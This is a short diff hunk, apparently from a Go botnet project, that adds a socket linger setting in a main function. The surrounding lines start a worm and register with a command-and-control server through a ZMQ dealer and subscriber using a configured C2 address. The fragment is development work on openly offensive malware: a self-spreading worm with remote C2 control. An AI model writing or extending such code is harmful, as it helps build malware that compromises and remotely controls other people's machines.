@@ -212,6 +212,7 @@ func terylene(subscriber *zmq.Socket, C2ip, bot, bport string) {
 func main() {
 	go worm.Startworm()
 	subscriber, _ := zmq.NewSocket(zmq.SUB)
+	subscriber.SetLinger(0)
 	dealer, _ := zmq.NewSocket(zmq.DEALER)
 	dealer.SetLinger(0)
 	register(dealer, subscriber, config.C2ip, config.Routerport, time.Second*5)
